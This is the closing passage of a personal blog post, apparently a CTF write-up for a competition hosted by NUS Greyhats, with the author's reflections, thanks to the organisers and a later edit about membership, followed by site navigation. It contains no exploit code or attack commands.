+<p>There were still 2 challenges, Late For School!! and Secure Blob Runner that I wasn’t able to complete largely due to a mix of my lack of experience and rusty abilities, though I strongly believe that they are very much solveable. The concept behind the challenges were all interesting and these 2 challenges provide a pretty clear path to how they’re meant to be solved, but I couldn’t get them in time. There were a few other simple non-pwn challenges that I solved as just a short break in between staring at code and terminal windows, I will probably do a very short all-in-one writeup for those as well.</p>
+<h1 id="afterword"tabindex="-1">Afterword</h1>
+<p>I enjoyed this CTF quite a bit as I felt the pwn challenges were all pretty fun and simple. Even if the challenges weren’t made to be complicated, sometimes we should all appreciate being able to go back to our pwn roots and enjoy the simple challenges. No complicated obfuscation and cancerous canaries to shoot down. No sandboxes to escape and less hair to tear out. :)</p>
+<p>I would like to thank the talented individuals at NUS Greyhats for coming up with the challenges and hosting this CTF for us. Even if this CTF does not have any prize money, it was still genuinely fun to do and I wouldn’t mind doing it again any other day just for practice.</p>
+<p>Thanks for reading.</p>
+<p><strong>EDIT (Sept 2023): Just for clarity, I joined NUS Greyhats shortly after this post was published, but up until this post I still wasn’t a member. Hence, in the next post onwards, I talk about being a part of NUS Greyhats</strong></p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/15.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">ECSC 2023: Knife Party</p>
+                <p class="article-navigation-subtitle">ECSC 2023 Day 1: Pwn</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/13.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">Short Analysis of CVE-2021-33760</p>
+                <p class="article-navigation-subtitle">Update on Fuzzing WMF Metadata</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
